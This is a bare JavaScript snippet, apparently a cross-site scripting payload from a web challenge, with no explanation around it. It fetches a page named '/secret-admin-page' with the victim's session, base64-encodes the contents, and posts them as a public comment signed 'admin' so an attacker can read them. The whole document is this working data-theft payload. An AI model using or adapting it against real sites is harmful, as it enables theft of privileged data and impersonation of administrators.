fetch("/secret-admin-page")
  .then(response => response.text()) 
  .then(adminData => {
    const postData = new URLSearchParams({
      // comment2: adminData, 
      comment2: btoa(adminData), 
      "comment-author": "admin"
    });
    return fetch("/post-comment", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      body: postData,
    });
  })
  .then(response => response.text())
  .then(result => {
    console.log("Post result:", result);
  })
  .catch(error => {
    console.error("There was a problem with the fetch operation:", error);
  });
